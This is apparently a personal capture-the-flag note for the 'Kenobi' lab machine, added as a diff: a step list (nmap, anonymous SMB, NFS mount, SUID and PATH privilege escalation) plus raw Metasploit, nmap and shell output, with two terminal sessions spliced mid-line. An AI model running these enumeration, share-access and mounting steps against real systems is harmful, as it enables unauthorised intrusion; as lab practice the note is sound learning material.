@@ -1,0 +1,130 @@
+- first run nmap
+- then run nmap smb_enumeration
+- try to login as anon & try to see if there are any useful files
+- try to run nmap nfs enumeration
+- mount the nfs on your host
+- find the relevant files for logging in as kaenobi user
+- try to find the suid files
+- try to modify env variables such as PATH & do priv escalation
+
+
+== Highlights
+
+msf6 auxiliary(scanner/smb/smb_enumshares) > use 5
+msf6 auxiliary(scanner/portscan/tcp) > run
+
+[+] 10.10.163.33:         - 10.10.163.33:21 - TCP OPEN
+[+] 10.10.163.33:         - 10.10.163.33:22 - TCP OPEN
+[+] 10.10.163.33:         - 10.10.163.33:80 - TCP OPEN
+[+] 10.10.163.33:         - 10.10.163.33:111 - TCP OPEN
+[+] 10.10.163.33:         - 10.10.163.33:139 - TCP OPEN
+[+] 10.10.163.33:         - 10.10.163.33:445 - TCP OPEN
+[+] 10.10.163.33:         - 10.10.163.33:2049 - TCP OPEN
+[*] 10.10.163.33:         - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/portscan/tcp) > back
+msf6 > nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.163.33
+[*] exec: nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.163.33
+
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-05 15:29 IST
+Nmap scan report for 10.10.163.33
+Host is up (0.16s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Host script results:
+| smb-enum-shares: 
+|   account_used: guest
+|   \\10.10.163.33\IPC$: 
+|     Type: STYPE_IPC_HIDDEN
+|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
+|     Users: 2
+|     Max Users: <unlimited>
+|     Path: C:\tmp
+|     Anonymous access: READ/WRITE
+|     Current user access: READ/WRITE
+|   \\10.10.163.33\anonymous: 
+|     Type: STYPE_DISKTREE
+|     Comment: 
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\home\kenobi\share
+|     Anonymous access: READ/WRITE
+|     Current user access: READ/WRITE
+|   \\10.10.163.33\print$: 
+|     Type: STYPE_DISKTREE
+|     Comment: Printer Drivers
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\var\lib\samba\printers
+|     Anonymous access: <none>
+|_    Current user access: <none>
+
+Nmap done: 1 IP address (1 host up) scanned in 37.90 seconds
+msf6 > nmap -p 111 --script=nfs-ls,nfs-showmount,nfs-statfs 10.10.163.33
+[*] exec: nmap -p 111 --script=nfs-ls,nfs-showmount,nfs-statfs 10.10.163.33
+
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-05 15:40 IST
+Nmap scan report for 10.10.163.33
+Host is up (0.16s latency).
+
+PORT    STATE SERVICE
+111/tcp open  rpcbind
+
+
+
+
+
+
+| nfs-showmount: 
+|_  /var *└─$ cat log.txt | grep -v ^#
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/kenobi/.ssh/id_rsa): 
+Created directory '/home/kenobi/.ssh'.
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /home/kenobi/.ssh/id_rsa.
+Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.
+The key fingerprint is:
+SHA256:C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q kenobi@kenobi
+The key's randomart image is:
++---[RSA 2048]----+
+|                 |
+|           ..    |
+|        . o. .   |
+|       ..=o +.   |
+|      . So.o++o. |
+|  o ...+oo.Bo*o  |
+| o o ..o.o+.@oo  |
+|  . . . E .O+= . |
+|     . .   oBo.  |
++----[SHA256]-----+
+
+
+┌──(kali㉿kali)-[/tmp/var]
+└─$ sudo mount -t nfs 10.10.163.33:/var /tmp/var -nolock
+                                                                                                                                                                                                         
+┌──(kali㉿kali)-[/tmp/var]
+└─$ echo $?                                                                                                                         
+0
+                                                                                                                                                                                                         
+┌──(kali㉿kali)-[/tmp]
+└─$ df -Th            
+Filesystem        Type      Size  Used Avail Use% Mounted on
+udev              devtmpfs  1.9G     0  1.9G   0% /dev
+tmpfs             tmpfs     393M  1.4M  391M   1% /run
+/dev/vda2         ext4       30G   14G   16G  47% /
+tmpfs             tmpfs     2.0G     0  2.0G   0% /dev/shm
+tmpfs             tmpfs     5.0M     0  5.0M   0% /run/lock
+/dev/vda1         vfat      512M  160K  512M   1% /boot/efi
+tmpfs             tmpfs     393M   80K  393M   1% /run/user/1000
+10.10.163.33:/var nfs4      8.8G  1.8G  6.6G  22% /tmp/var
+                                                                                                                                                                                                         
+┌──(kali㉿kali)-[/tmp]
+└─$ cd /tmp/var
+                                                                                                                                                                                                         
+┌──(kali㉿kali)-[/tmp/var]
+└─$ ls
+backups  cache  crash  lib  local  lock  log  mail  opt  run  snap  spool  tmp  www
+
